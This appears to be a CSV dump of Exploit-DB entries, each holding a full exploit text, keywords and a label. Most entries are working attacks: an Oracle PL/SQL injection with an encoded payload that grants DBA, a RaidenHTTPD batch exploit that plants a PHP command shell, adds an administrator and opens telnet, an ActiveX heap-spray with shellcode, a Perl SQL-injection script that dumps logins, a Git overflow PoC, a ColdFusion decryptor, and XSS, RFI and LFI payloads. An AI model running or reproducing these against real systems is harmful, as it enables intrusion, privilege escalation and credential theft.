--Connected to: --Oracle Database 10g Enterprise Edition Release 10.1.0.2.0 - Production --With the Partitioning, OLAP and Data Mining options -- -- -- --SQL> select * from user_role_privs; -- --USERNAME GRANTED_ROLE ADM DEF OS_ -------------------------------- ------------------------------ --- --- --- --SCOTT CONNECT NO YES NO --SCOTT RESOURCE NO YES NO -- --SQL> DECLARE -- 2 c2gya2Vy NUMBER; -- 3 BEGIN -- 4 c2gya2Vy := DBMS_SQL.OPEN_CURSOR; -- 5 DBMS_SQL.PARSE(c2gya2Vy,utl_encode.text_decode('ZGVjbGFyZSBwcmFnbWEgYXV0b25 --vbW91c190cmFuc2FjdGlvbjsgYmVnaW4gZXhlY3V0ZSBpbW1lZGlhdGUgJ0dSQU5UIERCQSBUTyBTQ09 --UVCc7Y29tbWl0O2VuZDs=','WE8ISO8859P1', UTL_ENCODE.BASE64),0); --6 SYS.LT.FINDRICSET('TGV2ZWwgMSBjb21sZXRlIDop.U2VlLnUubGF0ZXIp''||dbms_sql. --execute('||c2gya2Vy||')||''','DEADBEAF'); --7 END; --8 / --TGV2ZWWGMSBJB21SZXRLIDOP.U2VLLNUUBGF0ZXIP1 -- --PL/SQL procedure successfully completed. -- --SQL> select * from user_role_privs; -- --USERNAME GRANTED_ROLE ADM DEF OS_ -------------------------------- ------------------------------ --- --- --- --SCOTT CONNECT NO YES NO --SCOTT DBA NO YES NO --SCOTT RESOURCE NO YES NO -- --SQL> -- -- --  // milw0rm.com [2007-10-27]","[""'LT.FINDRICSET'""]",1
28472,Papoo CMS 3.2 - IBrowser Remote File Inclusion source: https://www.securityfocus.com/bid/19807/info  Papoo CMS is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  Papoo CMS 3.0.2 is reported vulnerable; other versions may also be affected.  http://www.example.com/interna/tiny_mce/plugins/ibrowser/ibrowser.php?tinyMCE_imglib_include=http://www.example.com,['IBrowser'],1
4747,"RaidenHTTPD 2.0.19 - 'ulang' Remote Command Execution rem raidenhttpdudo.cmd                    @echo off                    color 0a  rem RaidenHTTPD 2.0.19 ulang cmd exec poc exploit  rem WebAdmin one - not enabled by default anymore  rem however works regardless of  php.ini, because  rem ""ulang"" comes from $_GET[] and some magic_quo rem tes_gpc disable code,lame  divertissement one rem to demonstrate an  unauthenticated  directory  rem traversal  ... rem rgod ----------http://violentcop.splinder.com           if {%1}=={} goto kill  echo HEAD /?^<?ob_end_clean();ob_clean();passthru($_GET[CMD]);die;?^> HTTP/1.1>in echo Host: %1>>in & echo Connection: Close>>in & echo.>>in nc %1 80 -v -w1< in > nul echo ..\..\..\logs\access_%date:~6,4%-%date:~3,2%-%date:~0,2%.log%%00> puf & set /p exploit=< puf  echo GET /raidenhttpd-admin/workspace.php?CMD=cmd.exe+%%2Fc+net+user+sun+tzu+%%2Fadd+%%26+net+localgroup+Administrators+sun+%%2Fadd+%%26+sc+config+NtLmSsp+start%%3D+auto+%%26+sc+config+RpcSs+start%%3D+auto+%%26+net+start+RpcSs+%%26+net+start+NtLmSsp+%%26+sc+config+TlntSvr+start%%3D+auto+%%26+net+start+TlntSvr+%%26+netsh+firewall+add+portopening+tcp+23+sh+%%26+echo+REGEDIT4+%%3E+sh.reg+%%26+echo+%%5BHKEY_LOCAL_MACHINE%%5CSYSTEM%%5CCurrentControlSet%%5CControl%%5CLsa%%5D+%%3E%%3E+sh.reg+%%26+echo+%%22forceguest%%22%%3Ddword%%3A00000000+%%3E%%3E+sh.reg+%%26+regedit+%%2FS+sh.reg^&ulang=%exploit% HTTP/1.1> in echo Host: %1>>in & echo Connection: Close>>in & echo.>>in echo please wait ... nc %1 80 -v -w1< in > nul ping localhost -n 15>nul & rem delaying ... del puf del in                 telnet %1 23                  goto nowhere                    :kill             echo %0 [target-host]                   :nowhere  rem milw0rm.com [2007-12-18]","[""'ulang'"", 'raidenhttpdudo.cmd']",1
45912,"WebKit JSC - BytecodeGenerator::hoistSloppyModeFunctionIfNecessary Does not Invalidate the 'ForInContext' Object /* This is simillar to  issue 1263 . When hoisting a function onto the outer scope, if it overwrites the iteration variable for a for-in loop it should invalidate the corresponding ForInContext object, but it doesn't. As a result, an arbitrary object can be passed as the property variable to the op_get_direct_pname handler which uses the property variable directly as a string object without any check.  PoC: */  function trigger() {     let o = {a: 1};     for (var k in o) {         {             k = 0x1234;              function k() {              }         }          o[k];     } }  trigger();",['ForInContext'],1
33355,"PHD Help Desk 1.43 - 'solic_display.php?q_registros' Cross-Site Scripting source: https://www.securityfocus.com/bid/37029/info   PHD Help Desk is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied data.   Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials; other attacks are also possible.   PHD Help Desk 1.43 is vulnerable; other versions may also be affected.   http://www.example.com/solic_display.php?pagina=1&q_registros=[code]&orden=seq_solicitud_id","[""'solic_display.php?q_registros'""]",1
38336,"Git 1.9.5 - 'ssh-agent.exe' Buffer Overflow (PoC) ''' [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-GIT-SSH-AGENT-BUFF-OVERFLOW.txt    Vendor: ================================ git-scm.com    Product: ================================ Git-1.9.5-preview20150319.exe github.com/msysgit/msysgit/releases/tag/Git-1.9.5-preview20150319   Vulnerability Type: =================== Buffer Overflow    CVE Reference: ============== N/A    Vulnerability Details: ========================= Git Windows SVN ssh-agent.exe is vulnerable to buffer overflow. Under cmd dir in Git there is start-ssh-agent.cmd file used to invoke ssh-agent.exe. This is local attack vector in which if the ""start-ssh-agent.cmd"" file is replaced with specially crafted malicious '.cmd' file we cause buffer overflow, code execution may become possible.  Fault module seems to be msys-1.0.dll  File Name: msys-1.0.dll MD5: 39E779952FF35D1EB3F74B9C36739092 APIVersion: 0.46  Stack trace: ------------- MSYS-1.0.12 Build:2012-07-05 14:56 Exception: STATUS_ACCESS_VIOLATION at eip=41414141 eax=FFFFFFFF ebx=0028FA3C ecx=680A4C3A edx=680A4C3A esi=0028FA2C edi=00001DAC ebp=42424242 esp=0028F9B4 program=C:\Program Files (x86)\Git\bin\ssh-agent.exe cs=0023 ds=002B es=002B fs=0053 gs=002B ss=002B   Payload of 944 bytes to cause seg fault: @ 948 bytes we completely overwrite EBP register. @ 972 bytes KABOOOOOOOOOOM! we control EIP.   Quick GDB dump...  Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () (gdb) info r eax            0xffffffff       -1 ecx            0x680a4c3a       1745505338 edx            0x680a4c3a       1745505338 ebx            0x28f90c 2685196 esp            0x28f884 0x28f884 ebp            0x41414141       0x41414141 esi            0x28f8fc 2685180 edi            0x2660   9824 eip            0x41414141       0x41414141 eflags         0x10246  [ PF ZF IF RF ] cs             0x23     35 ss             0x2b     43 ds             0x2b     43 es             0x2b     43 fs             0x53     83 gs             0x2b     43    POC code(s): ===============  Python script below to create a malicious 'start-ssh-agent.cmd' file that will be renamed to 'ssh_agent_hell.cmd' and moved to the Git/bin directory, once run will cause buffer overflow and overwrite EIP.  Save following as ssh-agent-eip.py or whatever, run the script to generate a new malicious '.cmd' file and run it!  '''  import struct,os,shutil  #Git ssh-agent.exe #EIP overwrite at 972 bytes #By hyp3rlinx #======================================================  file=""C:\\Program Files (x86)\\Git\\bin\\ssh_agent_hell"" payload=""CALL ssh-agent.exe ""  x=open(file,""w"")  eip=""A""*4 payload+=""B""*968+eip x.write(payload) x.close() src=""C:\\Program Files (x86)\\Git\\bin\\"" shutil.move(file,file+"".cmd"")   print ""Git ssh-agent.exe buffer overflow POC\n"" print ""ssh_agent_hell.cmd file created!...\n"" print ""by hyp3rlinx"" print ""====================================\n""  ''' Disclosure Timeline: ========================================================= Vendor Notification:  August 10, 2015 Sept 26, 2015  : Public Disclosure     Exploitation Technique: ======================= Local    Description: ========================================================== Vulnerable Product:     [+]  Git-1.9.5-preview20150319.exe    ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx '''","[""'ssh-agent.exe'""]",1
7054,"Anti-Keylogger Elite 3.3.0 - 'AKEProtect.sys' Local Privilege Escalation //////////////////////////////////////////////////////////////////////////////////// // +----------------------------------------------------------------------------+ // // |                                                                            | // // | ISecSoft, Inc. - http://www.remove-keyloggers.com                          | // // |                                                                            | // // | Affected Software:                                                         | // // | Anti-Keylogger Elite <= 3.3.0                                              | // // |                                                                            | // // | Affected Driver:                                                           | // // | Anti-Keylogger Elite Driver - AKEProtect.sys <= 3.3.3.0                    | // // |                                                                            | // // | Local Privilege Escalation Exploit                                         | // // | For Educational Purposes Only !                                            | // // |                                                                            | // // +----------------------------------------------------------------------------+ // // |                                                                            | // // | NT Internals - http://www.ntinternals.org/                                 | // // | alex ntinternals org                                                       | // // | 07 November 2008                                                           | // // |                                                                            | // // | References:                                                                | // // | Exploiting Common Flaws in Drivers                                         | // // | Ruben Santamarta - http://reversemode.com/                                 | // // |                                                                            | // // +----------------------------------------------------------------------------+ // ////////////////////////////////////////////////////////////////////////////////////  Exploit: http://www.ntinternals.org/ntiadv0802/AKEProtect_Exp.zip backup: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/7054.zip (2008-AKEProtect_Exp.zip)  Advisory: http://www.ntinternals.org/ntiadv0802/ntiadv0802.html   # milw0rm.com [2008-11-07]","[""'AKEProtect.sys'""]",1
15776,"Virtual Store Open 3.0 - Acess SQL Injection #!/usr/bin/perl # # Script Name: Virtual Store Open <= 3.0  # Link1 : http://www.virtuastore.com.br/shopping.asp?link=ShoppingVirtuaStore # Link2 : http://www.virtuastore2010.com.br/ # Link3 Yahoo Group : http://br.groups.yahoo.com/group/virtuastore/ # Bug: Acess Sql Injection # Found: Br0ly  # google dork: inurl:""produtos.asp?produto="" # Use some base64 decode google IT. # After decoding  login and pass go to: www.site.com.br/administrador.asp # aoiuaoaaaaiuahiuahaaiauhaiuha EASY ??? # BRASIL!! :D # # exploit demo: #  #[br0ly@xploit web]$ perl virtualstore.txt http://server/produtos.asp?produto=98 # #  -------------------------------------- #   -Virutal Store OPen                   #   -ACESS Sql Injection                  #   -by Br0ly                             #  -------------------------------------- # #[+] GO: http://server/produtos.asp?produto=-1 #[+] Testing: 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25, #[+] URL_INJECTED:: http://server/produtos.asp?produto=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,c0li,24,25%20FROM%20acesso; #[+] LOGIN:: YWRtaW4= #[+] SENHA:: ZXVyZWth #[+] Done # # ADMIN PAINEL: http://server/administrador.asp # use IO::Socket::INET; use IO::Select; use HTTP::Request; use LWP::UserAgent;  #CONF  my $host   = $ARGV[0]; my $spc    = ""%20""; my $ce     = ""%26"";  my $fim_n  = 51;  my $login = ""chr(98)"".$spc.$ce.$spc.""chr(114)"".$spc.$ce.$spc.""chr(48)"".$spc.$ce.$spc.""chr(108)"".$spc.$ce.$spc.""chr(121)"".$spc.$ce.$spc.""login"".$spc.$ce.$spc.""chr(98)"".$spc.$ce.$spc.""chr(114)"".$spc.$ce.$spc.""chr(48)"".$spc.$ce.$spc.""chr(108)"".$spc.$ce.$spc.""chr(121)""; my $senha = ""chr(98)"".$spc.$ce.$spc.""chr(114)"".$spc.$ce.$spc.""chr(48)"".$spc.$ce.$spc.""chr(108)"".$spc.$ce.$spc.""chr(121)"".$spc.$ce.$spc.""senha"".$spc.$ce.$spc.""chr(98)"".$spc.$ce.$spc.""chr(114)"".$spc.$ce.$spc.""chr(48)"".$spc.$ce.$spc.""chr(108)"".$spc.$ce.$spc.""chr(121)"";   if(@ARGV < 1 ) { help(1); } $h0st = url_id($host); banner();   #GO   magic($h0st);  sub magic () {  	my $url    = $_[0]; 	my $union  = ""UNION"".$spc.""SELECT"".$spc; 	my $end    = ""FROM"".$spc.""acesso;"";	 	my $c0de   = """"; 	my $c0li   = """"; 	my $i = 1; 	my $content = """"; 	print ""[+] GO: $url\n""; 	syswrite(STDOUT,""[+] Testing: "",14); 	for($i = 1;$i <= $fim_n;$i += 1) { 		my @num_magic = char_str($i); 		my $num_edit  = edit_char(@num_magic);  		my $hex = ""chr(98)"".$ce.""chr(114)"".$ce.""chr(48)"".$ce.""chr(108)"".$ce.""chr(121)"".$ce.""$num_edit"".$ce.""chr(121)"".$ce.""chr(108)"".$ce.""chr(48)"".$ce.""chr(114)"".$ce.""chr(98)""; 		my $bin = ""br0ly"".$i.""yl0rb"";   		if(($i > 1) && ($i < $fim_n)) { 			$c0li = $c0li."","".$hex; 			$c0de = $c0de."","".$bin; 		}  		else { 			$c0li = $c0li.$hex; 			$c0de = $c0de.$bin; 		} 		syswrite(STDOUT,$i."","", 255); 		my $xpl   = $url.$spc.$union.$c0li.$spc.$end; 		$content  = get_query($xpl); 		$content  = tag($content); 		if($content =~ /fail/)  { $i = $fim_n+1; } 		if($content =~ m/br0ly/i) { 			$number  = ssdp_mid_str(""br0ly"",""yl0rb"",$content); 			$link1   = str_replace($c0de,""br0ly"".$number.""yl0rb"",""c0li""); 			$link2	 = str_replace($link1,""br0ly"",""""); 			$link3   = str_replace($link2,""yl0rb"",""""); 			$inject  = $url.$spc.$union.$link3.$spc.$end; 			$sql_i   = $inject; 			print ""\n[+] URL_INJECTED:: $inject\n""; 			$login_i = get_login($sql_i); 			if($login_i != 1) { 				print ""[+] LOGIN:: $login_i\n""; 			} 			else { 				print ""[-] FAIL TO GET LOGIN\n""; 			} 			$senha_i = get_senha($sql_i); 			if($senha_i != 1) { 				print ""[+] SENHA:: $senha_i\n""; 			} 			else { 				print ""[-] FAIL TO GET SENHA\n""; 			} 			$i = $fim_n; 		} 		if($i == $fim_n+1) { 			print (""[-] Failed to get magic number. Please try it manually :)\n"");  		} 	} 	print (""[+] Done\n"");			 }  sub tag () { 	my $string = $_[0]; 	$string =~ s/ /\$/g; 	$string =~ s/\s/\*/g; 	return($string); }  sub ssdp_mid_str () { 	my $left   = $_[0]; 	my $right  = $_[1]; 	my $string = $_[2]; 	my @exp  = split($left,$string); 	my @data = split($right,$exp[1]); 	return $data[0]; }  sub get_login () { 	my $sqli   = $_[0]; 	$login_aux = str_replace($sqli,""c0li"",$login); 	$query     = get_query($login_aux); 	if($query  =~ m/br0ly(.+)br0ly/i) { 		$login_r = $1; 		return $login_r; 	} 	else { return 1; } }  sub get_senha () { 	my $sqli   = $_[0]; 	$senha_aux = str_replace($sqli,""c0li"",$senha); 	$query     = get_query($senha_aux); 	if($query =~ m/br0ly(.+)br0ly/i) { 		$senha_r = $1; 		return $senha_r; 	} 	else { return 1; } }   sub url_id () { 	my $host = $_[0]; 	my $fail = ""fail""; 	if($host =~ /=(.+)/) { 		$id     = $1; 		$new_id = ""-1""; 		$host   = str_replace($host,$id,$new_id); 		return $host;   	} 	else { 		return $fail; 	} }  sub str_replace () {  	my $source  = shift;  	my $search  = shift;  	my $replace = shift;  	$source =~ s/$search/$replace/ge;  	return $source; }  sub get_query () { 	my $link = $_[0]; 	if($link =~ /http:\/\//) { $link =~ s/http:\/\///; } 	my $fail = ""fail"";  	my $req  = HTTP::Request->new(GET => ""http://"".$link);  	my $ua   = LWP::UserAgent->new();  	$ua->timeout(5);  	my $response = $ua->request($req);  	#if ($response->is_error) { print(""[-][Error] [timeout]\n""); return $fail; }  	return $response->content; }  sub char_str () { 	my $str_1 = $_[0];  	my @str_char = unpack(""C*"", $str_1);  	return @str_char; }   sub edit_char () {     	my @num = @_;   	my $num_t  = @num; 	my $num_magic;  	       	if($num_t > 1) { 		$num_magic = ""chr($num[0])"".$ce.""chr($num[1])""; 		return $num_magic; 	} 	else {				 		$num_magic = ""chr($num[0])""; 		return $num_magic; 	} }  sub help () { 	my $help = $_[0]; 	if($help == 1) { 		banner(); 		print ""[-] MISS URL..\n""; 		print ""[+] USE:EX: perl $0 http://www.site_find_in_google.com.br/produtos.asp?produto=98\n""; 		print ""[+] USE:EX-LIVE: perl $0 http://server/produtos.asp?produto=98\n""; 		exit(0); 	} }  sub banner() {  	print ""\n"".   	""  --------------------------------------\n"". 	""   -Virutal Store OPen                  \n"". 	""   -ACESS Sql Injection                 \n"". 	""   -by Br0ly                            \n"". 	""  --------------------------------------\n\n""; }",['bradministrador.asp '],1
22099,"CMSQLite 1.3.2 - Multiple Vulnerabilities Title: ====== CMSQLITE v1.3.2 - Multiple Web Vulnerabiltiies   Date: ===== 2012-10-18   References: =========== http://www.vulnerability-lab.com/get_content.php?id=726   VL-ID: ===== 726   Common Vulnerability Scoring System: ==================================== 4.3   Introduction: ============= CMSQLite is a small, fast, flexible and complete Content-Management-System (CMS). It s perfect for freelancers, self-employeds,  clubs and associations and small companies. CMSQLite is a CMS, basing on PHP and SQLite. That has many advantages! Comfortable Editor.  CMSQLite uses the award winning editor CKEditor. With this editor creating and maintaining your website will be as easy as working  with Word. Even complex web sites will be created with a snip of your fingers. CMSQLite supports natively mulit languages. The  standard installation supports German and English. All sites and menue items can be translated inside the CMS. An implemented language  detection shows your visitors the content in the specific language. Of course visitors of your web page can choose their preffered  language, too. Simple Handling CMSQLite is especially developed for users, who don t want to learn much about CMS. The backend structure  is simple and a few menu items make work easy and simple.  (Copy of the Vendor Homepage:  http://www.cmsqlite.net/index.php?c=1&mod=index&lang=en )   Abstract: ========= An independent Laboratory Researcher discovered multiple web vulnerabilities  in the CMSQLITE v1.3.2 Content Management System.   Report-Timeline: ================ 2012-10-18:	Public or Non-Public Disclosure   Status: ======== Published   Exploitation-Technique: ======================= Remote   Severity: ========= High   Details: ======== 1.1 A local file include vulnerability is detected in the CMSQLITE v1.3.2 Content Management System. The vulnerability allows a local privileged user account to include and load local system files. The vulnerability  is located in the mediaAdmin.php file with the bound vulnerable d parameter request. Successful exploitation of the  vulnerability results in a web server compromise via file load (webshell) or information disclosure via local system file include.  Vulnerable Module(s): 				[+] mediaAdmin.php   Vulnerable Parameter(s): 				[+] d=   1.2 A client side cross site scripting vulnerability is detected in the CMSQLITE v1.3.2 Content Management System. The vulnerability allows an attacker (remote) to hijack customer/moderator/admin sessions with medium required  user inter action. The security vulnerability is located in the mediaAdmin.php file with the bound vulnerable  d parameter request. Successful exploitation can result in account steal, client side phishing attacks, client  side malware load, external redirects or stable client side module context manipulation.  Vulnerable Module(s):                                  [+] mediaAdmin.php  Vulnerable Parameter(s):                                 [+] ?id=   1.3 Multiple client side cross site request forgery vulnerabilities are detected in the CMSQLITE v1.3.2 Content Management System. The vulnerability allows an attacker (remote) to form malicious webpages to execute application functions on client side requests with not expired application session. The security vulnerabilities are located in the deleteMenu, deleteCategory, deleteArticle,  addMenu, addCategory & addArticle modules. Successful exploitation can result in forced account add/delete and category/article  add/delete via not expired application session.   Proof of Concept: ================= 1.1 The local file include vulnerability can be exploited by local privileged user account without required user inter action. For demonstration or reproduce ...  PoC: http://cmsqlite.127.0.0.1:8080/cmsqlite/admin/mediaAdmin.php?d=../darius.php+$[NEW PATH]%00 http://cmsqlite.127.0.0.1:8080/cmsqlite/admin/mediaAdmin.php?d=darius.php+$[NEW PATH]%00    1.2 The client side cross site scripting vulnerability can be exploited by remote attackers without privileged application user account  and with low or medium required user inter action. For demonstration or reproduce ...  Review: id  <form name=""frm_UploadPic"" enctype=""multipart/form-data""  action=""anyfile.php?d=""><[MALICIOUS CLIENT SIDE SCRIPT CODE!]"">"" method=""post""> <input   PoC: http://cmsqlite.127.0.0.1:8080/cmsqlite/admin/mediaAdmin.php?id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C   1.3 The client side cross site request forgery vulnerabilities can be exploited by remote attackers without privileged application user account  and with medium or high required user inter action. For demonstration or reproduce ...  Affected Delete Element(s): 	javascript:deleteMenu, javascript:deleteCategory & javascript:deleteArticle Affected Add Element(s): 	javascript:addMenu, javascript:addCategory & javascript:addArticle   Reference(s): http://cmsqlite.127.0.0.1:8080/cmsqlite/admin/helper/deleteMenu.php http://cmsqlite.127.0.0.1:8080/cmsqlite/admin/helper/deleteArticle.php http://cmsqlite.127.0.0.1:8080/cmsqlite/admin/helper/deleteCategory.php   Risk: ===== 1.1 The security risk of the local file include vulnerability is estimated as high(-).  1.2 The security risk of the client site cross site scripting vulnerability is estimated as medium(-).  1.3 The security risk of the client site cross site request forgery vulnerabilties are estimated as low(+).   Credits: ======== Katharina S.L.  (katha@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2012 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com","['mediaAdmin.php ', 'anyfile.php?']",1
4594,"SonicWALL SSL-VPN - 'NeLaunchCtrl' ActiveX Control Remote Command Execution <!--  SonicWall SSL-VPN NeLaunchCtrl ActiveX Control exploit.  by krafty  greets to SK, muts, halvar, grugq, and all the ethnical hackers  sux to exploit traders - ZDI, WabiSabiLabi, and all you h0arders.  Bring back the days of technotronic and r00tshell! Freedom.  poc: launches calculator. Tested with IE6 XP SP2. I'm sure it works with IE7 and Vista and all that jing-bang.  -->   <object classid='clsid:6EEFD7B1-B26C-440D-B55A-1EC677189F30' id='nelx' /></object>  <script>  var shellcode = unescape(""%ue8fc%u0044%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%u7e68%ue2d8%u6873%ufe98%u0e8a%uff57%u63e7%u6c61%u2e63%u7865%u2065%u0000"");  var spray = unescape(""%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090""); do {    spray += spray; } while(spray.length < 0xc0000);  memory = new Array();  for(i = 0; i < 50; i++)    memory[i] = spray + shellcode;  buf = """"; for(i = 0; i < 50; i++)    buf += unescape(""%05%05%05%05"");  nelx.AddRouteEntry("""", buf);  </script>  # milw0rm.com [2007-11-01]","[""'NeLaunchCtrl'""]",1
19220,"Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages /* source: https://www.securityfocus.com/bid/275/info  A vulnerability in ColdFusion allows pages encrypted with the CFCRYPT.EXE utility to be decrypted.  ColdFusion supports the ability to ""encrypt"" the CFML templates in an application or component, using the CFCRYPT.EXE utility, so they can be redistributed or sold without exposing the source code to casual viewing. A program that decrypts ColdFusion's encryption has been discovered. This will in effect make the source code for all this propietary CFML applications available to those with access to their encrypted form.  */  /* CFDECRYPT: Decrypt Cold Fusion templates encrypted with CFCRYPT    Matt Chapman <matthewc@cse.unsw.edu.au>       Usage: cfdecrypt <encrypted.cfm >decrypted.cfm     Requires a DES encryption library to compile. */  #include <stdio.h> #include ""des.h""  int main(void) { 	char *header = ""Allaire Cold Fusion Template\012Header Size: ""; 	char buffer[54]; 	int headsize, outlen; 	int skip_header; 	int len, i;  	char *keystr = ""Error: cannot open template file--\""%s\"". Please, try again!\012\012""; 	des_cblock key; 	des_cblock input;  	des_cblock output; 	des_key_schedule schedule;  	if ((fread(buffer, 1, 54, stdin) < 54) || (memcmp(buffer, header, 42))) 	{ 		fprintf(stderr, ""File is not an encrypted template\n""); 		return 1; 	}  	if (!memcmp(&buffer[42], ""New Version"", 11)) 	{ 		headsize = 69; 		skip_header = 1; 	} 	else 	{ 		headsize = atoi(&buffer[42]); 		skip_header = 0; 	}  	if ((headsize < 54) || (fseek(stdin, headsize, SEEK_SET) < 0)) 	{ 		fprintf(stderr, ""Error in file format\n""); 		return 1; 	}  	des_string_to_key(keystr, &key); 	des_set_key(&key, schedule); 	outlen = 0;  	while ((len = fread(input, 1, 8, stdin)) == 8) 	{ 		des_ecb_encrypt(&input, &output, schedule, 0); 		outlen += 8; 		i = 0;  		if (skip_header) 		{ 			while (i < 8) 			{ 				if (output[i++] == 0x1A) 				{ 					skip_header = 0; 					break; 				} 			} 		}  		fwrite(output + i, 1, 8 - i, stdout); 	}  	for (i = 0; i < len; i++) 	{ 		output[i] = input[i] ^ (outlen + i); 	}  	fwrite(output, 1, len, stdout);  	return 0; }","[""'CFCRYPT.EXE'""]",1
31081,"OpenBSD 4.1 - bgplg 'cmd' Cross-Site Scripting source: https://www.securityfocus.com/bid/27535/info  OpenBSD bgplg is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  bgplg shipped with OpenBSD 4.1 is vulnerable; other versions may also be affected.   http://www.example.com/cgi-bin/bgplg?cmd=show+version<script>alert(""OpenBSD%20XSS)</script>","['bgplg', ""'cmd'""]",1
9435,"Linux Kernel 2.x (RedHat) - 'sock_sendpage()' Ring0 Privilege Escalation (1) /* dedicated to my best friend in the whole world, Robin Price    the joke is in your hands     just too easy -- some nice library functions for reuse here though     credits to julien tinnes/tavis ormandy for the bug     may want to remove the __attribute__((regparm(3))) for 2.4 kernels,    I have no time to test  spender@www:~$ cat redhat_hehe I bet Red Hat will wish they closed the SELinux vulnerability when they were given the opportunity to.  Now all RHEL boxes will get owned by leeches.c :p  fd7810e34e9856f77cba67f291ba115f33411ebd  d4b0e413ebf15d039953dfabf7f9a2d1  thanks to Dan Walsh for the great SELinux bypass even on ""fixed"" SELinux  policies  and nice work Linus on trying to silently fix an 8 year old  vulnerability, leaving vendors without patched kernels for their users.    use ./wunderbar_emporium.sh for everything  don't have mplayer? watch an earlier version of the exploit at: http://www.youtube.com/watch?v=arAfIp7YzZ4  */  http://www.grsecurity.net/~spender/wunderbar_emporium.tgz Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/9435.tgz (2009-wunderbar_emporium.tgz)  # milw0rm.com [2009-08-14]","[""'sock_sendpage()'""]",1
31593,"Microsoft Internet Explorer 8 Beta 1 - 'ieframe.dll' Script Injection source: https://www.securityfocus.com/bid/28581/info  Microsoft Internet Explorer is prone to a script-injection vulnerability when handling specially crafted requests to 'acr_error.htm' via the 'res://' protocol. The file resides in the 'ieframe.dll' dynamic-link library.  An attacker may leverage this issue to execute arbitrary code in the context of a user's browser. Successful exploits can allow the attacker to steal cookie-based authentication credentials, obtain potentially sensitive information stored on the victim's computer, and launch other attacks.  Internet Explorer 8 is vulnerable. Internet Explorer 7 is likely vulnerable as well, but this has not been confirmed.  res://ieframe.dll/acr_error.htm#<h1>foo</h1>,<h1>foo</h1> res://ieframe.dll/acr_error.htm#<iframe/src=''/onload='javascript:document.write(""<iframe/src=\""file://localhost/test.txt\""></iframe>"")'></iframe>,foo res://ieframe.dll/acr_error.htm#<iframe/src=''/onload='javascript:document.write(""<script/src=http://www.example.com/></script>"")'></iframe>,foo res://ieframe.dll/acr_error.htm#<iframe/src=''/onload='javascript:document.location=""file://..\\ServerName\\pipe\\PipeName""'></iframe>,foo","[""'ieframe.dll'""]",1
